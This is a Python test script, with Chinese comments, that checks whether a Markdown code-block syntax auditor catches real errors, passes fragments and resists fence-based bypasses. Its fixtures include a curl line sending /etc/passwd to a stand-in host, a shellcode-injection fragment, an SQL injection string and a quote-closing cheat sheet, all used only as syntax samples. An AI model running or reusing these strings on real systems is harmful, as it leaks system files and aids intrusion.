# -*- coding: utf-8 -*-
"""audit-doc-code.py 的负控：证明门禁既不漏报也不误报，且**不会被绕过**。

★ 为什么需要它
  门禁收紧到「零误报」之后，最危险的失败模式是**门禁把自己也一起放行了**：
  汇总数字上「全部通过」和「什么都不检查」长得一模一样。
  2026-10-10 对抗测试实测到三条真绕过：
    · 未闭合围栏 -> 后面整段内容逃过审计（假绿）
    · 大写 .MD -> 两个门禁都只认小写，文件整个逃过扫描
    · 缩进围栏 -> 旧实现压根没匹配，List 里的代码从没被审计过
  负控把这三类固定成回归用例。

退出码
  0  全部符合期望
  1  有漏报、误报，或门禁已被绕过
"""
import io
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
AUDIT = os.path.join(HERE, "audit-doc-code.py")
PY = sys.executable


def _gate_capabilities():
    """直接问门禁自己：它的 powershell / yara 判据可用吗。

    ★ 2026-10-17 踩过的坑：最初这里自己探测 `shutil.which("powershell") or
    shutil.which("pwsh")`，而门禁用的是 `shutil.which("powershell")`（只有这个名字）。
    GitHub 的 ubuntu runner **预装了 pwsh 但没有 powershell** —— 于是两边判据不一致：
    门禁返回 SKIP、负控却以为"本机该判红"，又变成假 NG。
    现在改为加载门禁模块、读它自己的 `PS` / `YARA` 全局量，判据不可能再漂移。
    """
    spec = importlib.util.spec_from_file_location("_audit_doc_code_probe", AUDIT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return bool(getattr(mod, "PS", None)), bool(getattr(mod, "YARA", None))


PS_AVAILABLE, YARA_AVAILABLE = _gate_capabilities()

# SKIP 原因 -> 本机是否具备该判据。不具条件时，「期望 catch」的用例记为 SKIP（不计漏报）。
_PLATFORM_SKIP = {
    "no powershell": PS_AVAILABLE,
    "no yara binary": YARA_AVAILABLE,
}

# (用例名, 围栏语言, 代码, 期望, 说明)
#   期望 "catch" = 必须报真错；"pass" = 必须放行（片段 / 合法 / 不参与编译）
CASES = [
    # ---------- 必须抓出的真错 ----------
    ("py-indent", "python",
     "def f():\n    x = 1\n  y = 2\n    return x + y\n",
     "catch", "python 缩进错"),
    ("py-syntax", "python",
     "import os\n\ndef f(:\n    pass\n",
     "catch", "python 语法错（def 开头也必须抓）"),
    ("py-duparg", "python",
     "def f(a, a):\n    return a\n",
     "catch", "python 重复参数名"),
    ("json-missing", "json",
     '{\n  "a": 1,\n  "b": ,\n}\n',
     "catch", "json 缺值"),
    ("json-nocomma", "json",
     '{\n  "a": 1\n  "b": 2\n}\n',
     "catch", "json 缺逗号"),
    ("js-brace", "javascript",
     "const a = require('x');\nfunction f( {\n  return 1\n}\n",
     "catch", "js 括号错"),
    ("sh-undone", "bash",
     "#!/bin/bash\nset -e\nfor i in 1 2 3; do\n  echo $i\n",
     "catch", "bash 缺 done"),
    ("ps-parse", "powershell",
     "function Get-X {\n  $a = 1\n",
     "catch", "powershell 缺右括号"),
    # ★ 2026-10-10 对抗组发现的漏网：`def f():` + 残缺函数体。
    #   「只有定义没有调用」这条判据只对**完整**的函数成立；
    #   函数体本身编译不过时必须先报语法错，不能先归片段。
    ("py-badbody", "python",
     "import os\n\ndef f():\n    x = = 1\n",
     "catch", "python 函数体语法错（不是「只有定义」）"),
    # ★ 2026-10-17：yara 判据此前**没有任何负控**，而它的调用形态在本机是错的
    #   （YARA-X 必须 `scan <rules> <target>`；旧式无子命令形态 rc=2 ->
    #   8 个 yara 围栏全被误判 SYNTAX_ERR）。这两条把形态钉死。
    #   无 yara 的机器上会 SKIP（与 ps-parse 的平台守卫同构）。
    ("yara-missing-condition", "yara",
     "rule t {\n strings:\n  $a = \"MZ\"\n}\n",
     "catch", "yara 缺 condition 子句"),
    ("yara-valid-rule", "yara",
     "rule t {\n strings:\n  $a = \"MZ\"\n condition:\n  $a\n}\n",
     "pass", "yara 合法规则（形态对了才放行）"),

    # ---------- 必须放行：合法 / 片段 / 伪码 / 模板 ----------
    ("py-complete", "python",
     "import os\n\ndef main():\n    print(os.getcwd())\n\nmain()\n",
     "pass", "python 完整脚本"),
    ("py-return-noval", "python",
     "def f():\n    return 1\n\ndef g():\n    return\n",
     "pass", "python return 无值（3.8+ 合法）"),
    ("py-else", "python",
     "else:\n    pass\n",
     "pass", "python else 开头片段"),
    ("py-barecall", "python",
     "sc_addr = VirtualAllocEx(h, None, len(sc))\n",
     "pass", "python 顶层裸赋值片段"),
    ("py-defonly", "python",
     "def f():\n    return 1\n",
     "pass", "python 只有定义没调用"),
    ("json-tpl", "json",
     '{\n  "name": "<tool-name>",\n  "x": 1\n}\n',
     "pass", "json 占位符模板"),
    ("json-single", "json",
     '"just-a-string"\n',
     "pass", "json 单个值"),
    ("json-multi", "json",
     '{\n  "a": 1\n}\n{\n  "b": 2\n}\n',
     "pass", "json 多文档连写（文档惯例）"),
    ("sh-ok", "bash",
     "#!/bin/bash\ncurl http://x/$(cat /etc/passwd)\n",
     "pass", "bash 合法脚本"),
    ("sh-placeholder", "bash",
     "python3 tool.py <token> -X k\ncurl http://x/\n",
     "pass", "bash 含 <占位符> 命令清单"),
    ("sh-steps", "bash",
     "# x64dbg\n1. Load binary\n2. Run to OEP\n",
     "pass", "bash 编号步骤清单"),
    ("sh-gdb", "bash",
     "# gdb\n(gdb) target remote :3333\n(gdb) x/20i $pc\n",
     "pass", "bash gdb 控制台"),
    ("sh-frida", "bash",
     "Java.perform(function() {\n    var A = Java.use(\"x\");\n});\n",
     "pass", "bash 围栏里的 Frida JS"),
    ("sh-http", "bash",
     "# 探针\nPOST /api/register {\"u\":\"a\"}\n",
     "pass", "bash 围栏里的 HTTP 伪码"),
    ("sql-inject", "sql",
     "INSERT INTO users (username) VALUES ('admin'--')\n",
     "pass", "SQL 注入示例（故意不配平）"),
    ("sql-cheatsheet", "sql",
     "-- 常见闭合\n'       -- 单引号\n'))--   -- 双重括号\n",
     "pass", "SQL 闭合符号速查表"),
    ("text-block", "text",
     "D 语言符号形如 _D4mainQaFNaNbNfZv\n",
     "pass", "text 围栏不参与编译"),
]

# 对抗组：(说明, 文件名, 整文件内容, 期望)
#   期望 True = 必须被抓（不能逃过扫描）；False = 必须放行
ADVERSARIAL = [
    ("未闭合围栏：后面藏真错，必须报出",
     "adv-unclosed.md",
     "# t\n\n```python\ndef f(:\n    BROKEN\n",
     True),
    ("大写 .MD：必须被抓（只认小写就是逃过扫描）",
     "adv-upper.MD",
     "# t\n\n```python\ndef f(:\n    BROKEN\n```\n",
     True),
    ("波浪号围栏 ~~~：CommonMark 合法，必须被抓",
     "adv-tilde.md",
     "# t\n\n~~~python\ndef f(:\n    BROKEN\n~~~\n",
     True),
    ("列表内缩进围栏：合法代码，必须放行",
     "adv-indent.md",
     "步骤：\n\n1. 先建会话：\n\n   ```python\n"
     "   import curl_cffi.requests as rq\n"
     "   s = rq.Session(impersonate=\"chrome\")\n   ```\n",
     False),
    ("缩进围栏里的真错：必须被抓",
     "adv-indent-bad.md",
     "1. 看这段：\n\n   ```python\n   def f(:\n       BROKEN\n   ```\n",
     True),
    ("波浪号围栏里的合法代码：必须放行",
     "adv-tilde-ok.md",
     "# t\n\n~~~python\nimport os\nprint(os.getcwd())\n~~~\n",
     False),
    # ★ 2026-10-10 模糊测试（400 个随机 md）新增两类，负控 12/12 全绿时盖不住：
    #   1) 异类围栏互闭合：``` 块里的 ~~~ 把块关掉 —— 整块连同语法错一起消失，
    #      旧实现只比长度不比对字符类，rc 仍为 0（假绿）。
    #   2) 缩进围栏内混顶格行：dedent 的公共前缀为空 -> 变成空操作 -> 假红。
    ("异类围栏互闭合：~~~ 不能闭合 ``` 块",
     "adv-mix-fence.md",
     "# t\n\n```python\n~~~\nimport os\ndef lost(:\n```\n",
     True),
    # ★ 2026-10-10 模糊测试（400 个随机 md）新增的第二类。
    #   旧实现用 textwrap.dedent：块内只要有一行顶格（很常见 ——
    #   Python 里函数体外那句调用），公共前缀就变空，dedent 变**空操作**，
    #   缩进全部残留，整块误报成 IndentationError。
    #   这里的内容**本身是合法 Python**：dedent 修好后必须被放行。
    #   （我第一版把它写成期望"抓出"，是把"dedent 失效的表现"和
    #    "内容有语法错"混为一谈 —— 负控自己写错也会 NG，这本身是好事。）
    ("缩进围栏内混顶格行：合法代码必须放行（dedent 不能变空操作）",
     "adv-indent-flush.md",
     "1. step:\n\n   ```python\n   import os\n   def f():\n"
     "       return os.name\nprint(f())\n   ```\n",
     False),
]


def _audit(root):
    out_json = os.path.join(root, "result.json")
    p = subprocess.run([PY, "-B", AUDIT, "--root", root, "--json", out_json],
                       capture_output=True, timeout=900)
    if not os.path.exists(out_json):
        sys.stderr.write(p.stdout.decode("utf-8", "replace"))
        sys.stderr.write(p.stderr.decode("utf-8", "replace"))
        return None, None
    return json.load(io.open(out_json, encoding="utf-8")), p.returncode


def _norm(paths, root):
    return {os.path.basename(p).lower() for p in paths}


def main():
    root = tempfile.mkdtemp(prefix="audit-negctl-")
    try:
        for name, lang, code, _want, _desc in CASES:
            io.open(os.path.join(root, name + ".md"), "w",
                    encoding="utf-8", newline="\n").write(
                        "# fixture\n\n```%s\n%s```\n" % (lang, code))

        data, _rc = _audit(root)
        if data is None:
            print("FAIL: audit-doc-code.py --json 没有产出结果文件")
            return 1

        found = {(b["path"], b["lang"]): b["msg"]
                 for b in data.get("real_bugs", [])}
        # ★ 2026-10-17：SKIP 明细 —— 用来区分「跳过」与「真的干净」。
        skipped = {(b["path"], b["lang"]): b["msg"]
                   for b in data.get("skipped", [])}
        # 未闭合围栏不算 real_bug（它是独立的 unclosed 列表）
        unclosed_paths = {p for p, _l, _lang
                          in data.get("unclosed", [])}

        print("=" * 74)
        print("audit-doc-code.py 负控：%d 个常规用例 + %d 个对抗用例"
              % (len(CASES), len(ADVERSARIAL)))
        print("=" * 74)
        print("%-32s %-6s %-6s %s" % ("用例", "期望", "实际", "说明"))
        print("-" * 74)

        miss, extra = [], []
        skipped_cases = []
        for name, lang, _code, want, desc in CASES:
            key = (name + ".md", lang)
            hit = found.get(key)
            skip_msg = skipped.get(key, "")
            platform_skip = (want == "catch" and hit is None and skip_msg
                             and not _PLATFORM_SKIP.get(skip_msg, True))
            if platform_skip:
                # 本机不具备该判据（无 PowerShell / 无 yara）—— 平台差异，不算漏报
                skipped_cases.append("%s（%s）" % (desc, skip_msg))
                print("%-32s %-6s %-6s %s"
                      % (desc[:30], want, "SKIP", "SKIP(平台无此判据)"))
                continue
            good = (hit is not None) == (want == "catch")
            if want == "catch" and hit is None:
                miss.append(desc)
            elif want == "pass" and hit is not None:
                extra.append("%s <- %s" % (desc, hit[:60]))
            print("%-32s %-6s %-6s %s"
                  % (desc[:30], want, "catch" if hit else "pass",
                     "OK" if good else "NG"))
        if skipped_cases:
            print("跳过（本机无对应判据）：%d 条" % len(skipped_cases))
            for s in skipped_cases:
                print("   - " + s)

        # ---------------- 对抗组 ----------------
        print()
        print("--- 对抗组（门禁会不会被绕过）---")
        adv_ok = True
        for desc, fname, content, want_catch in ADVERSARIAL:
            io.open(os.path.join(root, fname), "w",
                    encoding="utf-8", newline="\n").write(content)
        data2, rc2 = _audit(root)
        if data2 is None:
            print("FAIL: 对抗组复跑没有结果")
            return 1
        hit_paths = _norm({b["path"] for b in data2.get("real_bugs", [])},
                          root)
        unc_paths = _norm({p for p, _l, _g
                           in data2.get("unclosed", [])}, root)
        for desc, fname, _content, want_catch in ADVERSARIAL:
            key = os.path.basename(fname).lower()
            hit = key in hit_paths or key in unc_paths
            good = hit == want_catch
            adv_ok = adv_ok and good
            if want_catch and not hit:
                miss.append(desc)
            elif (not want_catch) and hit:
                extra.append(desc)
            print("%-46s %s %s"
                  % (desc[:44], "抓出" if hit else "放行",
                     "OK" if good else "NG"))
        # 未闭合必须让门禁失败（退出码非 0）
        if rc2 == 0 and unc_paths:
            print("%-46s %s %s" % ("未闭合围栏必须让门禁退出码非 0",
                                    "rc=0", "NG"))
            adv_ok = False

        print()
        print("漏报（真 bug / 绕过 未被抓）: %s" % (miss or "无"))
        print("误报（合法 / 片段被当错）:   %s" % (extra or "无"))

        verdicts = data.get("verdicts", {})
        if not verdicts.get("RUNS"):
            print("FAIL: 门禁一次都没成功编译过任何块 —— 它已经失效")
            return 1
        print("门禁实际编译成功 %d 块（RUNS）" % verdicts["RUNS"])

        if miss or extra or not adv_ok:
            print()
            print("NG: 门禁判据与期望不一致")
            return 1
        print()
        print("OK: 漏报 0 / 误报 0 / 绕过 0，门禁确实在工作")
        return 0
    finally:
        shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())